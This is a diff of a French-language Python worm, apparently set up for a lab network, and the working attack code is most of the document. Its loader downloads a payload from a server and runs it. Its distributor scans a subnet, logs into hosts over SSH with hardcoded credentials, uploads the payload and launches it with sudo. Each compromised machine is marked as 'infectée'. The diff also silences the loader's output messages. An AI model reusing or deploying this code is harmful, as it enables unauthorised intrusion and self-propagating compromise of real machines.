@@ -11,25 +11,34 @@ import requests
 import zipfile
 
 # =============================================================================
-# ⚙️ CONFIGURATION GÉNÉRALE (SÉCURISÉE & RÉCURSIVE)
+# CONFIGURATION GÉNÉRALE (SÉCURISÉE & RÉCURSIVE)
 # =============================================================================
 CONFIG = {
     # --- SECTION RÉSEAU (DISTRIBUTION) ---
-    "NETWORK": "192.168.1.0/24", 
-    "USERNAME": "labuser", 
-    "PASSWORD": "password123", 
-    "BLACKLIST": ["192.168.1.1", "192.168.1.10"], # IPs à ignorer
+    "NETWORK": "192.168.50.0/24", 
+    "USERNAME": "Candidat", 
+    "PASSWORD": "P@ssw0rd", 
+    "BLACKLIST": ["192.168.50.255", "192.168.50.50"], # IPs à ignorer
     
     # Marqueurs pour éviter les boucles infinies de propagation
     "MARKER_LINUX": "/tmp/.sys_updated",
     "MARKER_WIN": "C:/Users/Public/.sys_updated",
 
     # --- SECTION SERVEUR (LOADER) ---
-    "SERVER_IP": "1.2.3.4",
+    "SERVER_IP": "192.168.50.50",
     "SERVER_PORT": "8080",
-    "FILE_NAME": "payload.zip",
-    "EXEC_TARGET": "mon_script.py",  # Fichier à lancer après extraction
+    "FILE_NAME": "payload.py",
+    "EXEC_TARGET": "payload.py",  # Fichier à lancer après extraction
     "EXEC_TYPE": "python",           # "python" ou "direct"
+    
+    "LINUX":{
+	"DEST":"/tmp/payload.py",
+	"CMD":"sudo python3 /tmp/payload.py &",
+},
+    "WINDOWS":{
+        "DEST":"C:/Users/Public/payload.py",
+        "CMD":'cmd /c start /B pyhtonw "C:/Users/Public/payload.py',
+},
 
     # --- PERFORMANCES ---
     "SCAN_THREADS": 30,
@@ -61,7 +70,7 @@ def download_and_execute():
     save_path = os.path.join(os.path.expanduser("~"), "Downloads", CONFIG["FILE_NAME"])
     extract_path = os.path.join(os.path.expanduser("~"), "Downloads", "payload")
 
-    print(f"{COLOR_BLUE}[*] Tentative de téléchargement du payload...{COLOR_RESET}")
+   # print(f"{COLOR_BLUE}[*] Tentative de téléchargement du payload...{COLOR_RESET}")
     try:
         response = requests.get(url, stream=True, timeout=10)
         response.raise_for_status()
@@ -69,23 +78,23 @@ def download_and_execute():
         with open(save_path, "wb") as f:
             for chunk in response.iter_content(chunk_size=8192):
                 if chunk: f.write(chunk)
-        print(f"{COLOR_GREEN}[+] Payload téléchargé : {save_path}{COLOR_RESET}")
+       # print(f"{COLOR_GREEN}[+] Payload téléchargé : {save_path}{COLOR_RESET}")
     except Exception as e:
-        print(f"{COLOR_RED}[-] Échec téléchargement : {e}{COLOR_RESET}")
+       # print(f"{COLOR_RED}[-] Échec téléchargement : {e}{COLOR_RESET}")
         return False
 
     try:
         os.makedirs(extract_path, exist_ok=True)
         with zipfile.ZipFile(save_path, "r") as z:
             z.extractall(extract_path)
-        print(f"{COLOR_GREEN}[+] Extraction réussie dans : {extract_path}{COLOR_RESET}")
+        #print(f"{COLOR_GREEN}[+] Extraction réussie dans : {extract_path}{COLOR_RESET}")
     except Exception as e:
-        print(f"{COLOR_RED}[-] Échec extraction : {e}{COLOR_RESET}")
+        #print(f"{COLOR_RED}[-] Échec extraction : {e}{COLOR_RESET}")
         return False
 
     target_path = os.path.join(extract_path, CONFIG["EXEC_TARGET"])
     if not os.path.exists(target_path):
-        print(f"{COLOR_RED}[-] Fichier cible introuvable : {target_path}{COLOR_RESET}")
+        #print(f"{COLOR_RED}[-] Fichier cible introuvable : {target_path}{COLOR_RESET}")
         return False
 
     try:
@@ -97,11 +106,11 @@ def download_and_execute():
         print(f"{COLOR_GREEN}[+] Payload exécuté avec succès.{COLOR_RESET}")
         return True
     except Exception as e:
-        print(f"{COLOR_RED}[-] Erreur exécution : {e}{COLOR_RESET}")
+       # print(f"{COLOR_RED}[-] Erreur exécution : {e}{COLOR_RESET}")
         return False
 
 # -----------------------------------------------------------------------------
-# PARTIE 2 : LE DISTRIBUTEUR (SCAN ET PROPAGATION)
+# PARTIE  LE DISTRIBUTEUR (SCAN ET PROPAGATION)
 # -----------------------------------------------------------------------------
 
 def is_blacklisted(ip):
@@ -128,54 +137,61 @@ def worker(ip_queue, active_ips, lock):
         ip_queue.task_done()
 
 def deploy_recursive(ip):
-    """Propage le script actuel sur la cible"""
+    """Envoie le payload unique et le lance directement"""
     try:
+        print(f"{COLOR_BLUE}[*] Analyse de la machine {ip}...{COLOR_RESET}")
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(ip, username=CONFIG["USERNAME"], password=CONFIG["PASSWORD"], timeout=10)
 
-        # Détection OS et Marqueur
+        # 1. Détection OS
         stdin, stdout, stderr = ssh.exec_command("uname")
         os_type = stdout.read().decode().strip()
 
+        marker = None
+        os_label = ""
+        dest_path = ""
+        run_cmd = ""
+
         if "Linux" in os_type:
-            target_dest = "/tmp/distributeur.py"
-            marker = CONFIG["MARKER_LINUX"]
-            cmd = f"sudo python3 {target_dest} &"
             os_label = "DEBIAN"
+            marker = CONFIG["MARKER_LINUX"]
+            dest_path = "/tmp/" + CONFIG["FILE_NAME"]
+            run_cmd = f"sudo python3 {dest_path} &" 
         else:
             stdin, stdout, stderr = ssh.exec_command("ver")
             if stdout.read():
-                target_dest = "C:/Users/Public/distributeur.py"
-                marker = CONFIG["MARKER_WIN"]
-                cmd = f'start python "{target_dest}"'
                 os_label = "WINDOWS"
-            else:
-                ssh.close()
-                return
+                marker = CONFIG["MARKER_WIN"]
+                dest_path = "C:/Users/Public/" + CONFIG["FILE_NAME"]
+                run_cmd = f'start /B python "{dest_path}"'
 
-        # Anti-boucle
-        check_marker = ssh.exec_command(f"ls {marker}")
-        if check_marker.stdout.channel.recv_exit_status() == 0:
+        if not marker:
+            ssh.close(); return
+
+        # 2. Anti-boucle (Marqueur)
+        stdin, stdout, stderr = ssh.exec_command(f"ls {marker}")
+        if stdout.channel.recv_exit_status() == 0:
             print(f"{COLOR_YELLOW}[SKIP] {ip} déjà infectée.{COLOR_RESET}")
-            ssh.close()
-            return
+            ssh.close(); return
 
-        # Transfert du script lui-même (sys.argv[0])
+        # 3. Transfert direct du fichier unique (Pas de ZIP !)
         sftp = ssh.open_sftp()
-        sftp.put(sys.argv[0], target_dest)
+        if not os.path.exists(CONFIG["FILE_NAME"]):
+            print(f"{COLOR_RED}[!] {CONFIG['FILE_NAME']} manquant localement !{COLOR_RESET}")
+            sftp.close(); ssh.close(); return
+
+        sftp.put(CONFIG["FILE_NAME"], dest_path)
+        
+        # 4. Création marqueur et Lancement
+        ssh.exec_command(f"sudo touch {marker}" if os_label == "DEBIAN" else f'echo "inf" > {marker}')
+        ssh.exec_command(run_cmd)
+        
+        print(f"{COLOR_GREEN}[SUCCESS] {ip} infectée avec succès !{COLOR_RESET}")
         sftp.close()
-
-        # Création du marqueur
-        if os_label == "DEBIAN": ssh.exec_command(f"sudo touch {marker}")
-        else: ssh.exec_command(f'echo "done" > {marker}')
-
-        # Lancement
-        ssh.exec_command(cmd)
-        print(f"{COLOR_GREEN}[SUCCESS] Propagé sur {ip} ({os_label}){COLOR_RESET}")
         ssh.close()
     except Exception as e:
-        print(f"{COLOR_RED}[FAILED] Erreur sur {ip}: {str(e)}{COLOR_RESET}")
+        print(f"{COLOR_RED}[FAILED] {ip}: {e}{COLOR_RESET}")
 
 def main():
     print_banner()
@@ -191,11 +207,11 @@ def main():
     except: pass
 
     # 2. PHASE LOADER (L'action immédiate sur la machine)
-    print(f"{COLOR_YELLOW}🚀 Phase 1 : Exécution du Loader...{COLOR_RESET}")
+    print(f"{COLOR_YELLOW} Phase 1 : Exécution du Loader...{COLOR_RESET}")
     download_and_execute()
 
     # 3. PHASE DISTRIBUTION (La propagation récursive)
-    print(f"\n{COLOR_BLUE}🔍 Phase 2 : Propagation au réseau {CONFIG['NETWORK']}...{COLOR_RESET}")
+    print(f"\n{COLOR_BLUE} Phase 2 : Propagation au réseau {CONFIG['NETWORK']}...{COLOR_RESET}")
     try:
         network = ipaddress.ip_network(CONFIG["NETWORK"], strict=False)
         ips_to_scan = list(network.hosts()) if network.num_addresses > 2 else list(network)
@@ -230,7 +246,7 @@ def main():
             deploy_threads = []
 
     for t in deploy_threads: t.join()
-    print(f"\n{COLOR_GREEN}🏁 Cycle terminé. Le payload a été distribué et lancé.{COLOR_RESET}")
+    print(f"\n{COLOR_GREEN} Cycle terminé. Le payload a été distribué et lancé.{COLOR_RESET}")
 
 if __name__ == "__main__":
     main()
